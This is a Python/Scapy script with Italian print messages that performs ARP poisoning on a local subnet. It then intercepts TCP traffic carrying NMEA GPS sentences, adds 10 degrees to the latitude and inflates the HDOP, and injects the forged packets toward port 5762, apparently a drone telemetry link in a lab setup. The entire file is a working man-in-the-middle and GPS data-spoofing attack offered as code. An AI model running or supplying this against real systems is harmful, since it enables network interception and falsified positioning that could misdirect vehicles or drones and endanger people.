import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import ARP
import time
import uuid
import socket

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
    return mac

def get_local_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.1)
    try:
        s.connect(('10.255.255.255', 1))
        ip_address = s.getsockname()[0]
    except Exception as e:
        ip_address = '127.0.0.1'
    finally:
        s.close()
    return ip_address

def arp_poison(client_ip, target_ip, target_port):
    source_mac = get_mac_address()
    source_ip = get_local_ip_address()
    print(f"Il tuo indirizzo MAC: {source_mac}")
    print(f"Il tuo indirizzo IP: {source_ip}")

    arp_response_client = ARP(op=2, pdst=client_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=source_ip, hwsrc=source_mac)
    arp_response_target = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=client_ip, hwsrc=source_mac)

    scapy.send(arp_response_client, verbose=False)
    scapy.send(arp_response_target, verbose=False)
    print("ARP poisoning completato.")
    
    
    time.sleep(2)

def modify_coordinates(nmea_data):
    modified_data = []

    for line in nmea_data:
        if line.startswith("GPGGA"):
            parts = line.split(",")
            latitude = float(parts[2][:2]) + float(parts[2][2:]) / 60
            print(f"Latitudine originale (GPGGA): {latitude:.3f}")
            latitude += 10
            parts[2] = f"{latitude:.3f}"
            print(f"Latitudine modificata (GPGGA): {latitude:.3f}")
            modified_data.append(",".join(parts))
        elif line.startswith("GPGSA"):
            parts = line.split(",")
            hdop = float(parts[15])
            print(f"HDOP originale (GPGSA): {hdop:.1f}")
            hdop += 10
            parts[15] = f"{hdop:.1f}"
            print(f"HDOP modificato (GPGSA): {hdop:.1f}")
            modified_data.append(",".join(parts))
        elif line.startswith("GPRMC"):
            parts = line.split(",")
            latitude = float(parts[3][:2]) + float(parts[3][2:]) / 60
            print(f"Latitudine originale (GPRMC): {latitude:.3f}")
            latitude += 10
            parts[3] = f"{latitude:.3f}"
            print(f"Latitudine modificata (GPRMC): {latitude:.3f}")
            modified_data.append(",".join(parts))
        else:
            modified_data.append(line)

    return modified_data

def handle_packet(packet, target_ip, target_port):
    if IP in packet and TCP in packet and packet[IP].dst == target_ip and packet[TCP].dport == target_port:
        nmea_data = packet[TCP].payload.load.decode("ascii").split("\r\n")
        print("Pacchetto ricevuto:")
        print(nmea_data)

        modified_nmea_data = modify_coordinates(nmea_data)

        original_packet = IP(dst=target_ip, src=packet[IP].src) / TCP(dport=target_port, sport=5762) / "\r\n".join(nmea_data)
        modified_packet = IP(dst=target_ip, src=packet[IP].src) / TCP(dport=target_port, sport=5762) / "\r\n".join(modified_nmea_data)

        print("Pacchetto originale:")
        original_packet.show()
        print("Pacchetto modificato:")
        modified_packet.show()

        scapy.send(modified_packet, verbose=False)
        print("Pacchetto modificato ed inviato.")

def get_arp_table():
    arp_request = scapy.ARP(pdst="172.18.0.1/16")  # Modifica con la tua subnet
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    print("Tabella ARP:")
    for element in answered_list:
        print(f"IP: {element[1].psrc} - MAC: {element[1].hwsrc}")

def main():
    client_ip = "172.18.0.3"
    target_ip = "172.18.0.2"
    target_port = 5762

    print("Tabella ARP prima dell'ARP poisoning:")
    get_arp_table()

    arp_poison(client_ip, target_ip, target_port)

    print("Tabella ARP dopo l'ARP poisoning:")
    get_arp_table()

    

    while True:
        packets = scapy.sniff(filter=f"tcp and (src host {client_ip} and src port 3000)", prn=lambda x: handle_packet(x, target_ip, target_port))

if __name__ == "__main__":
    main()
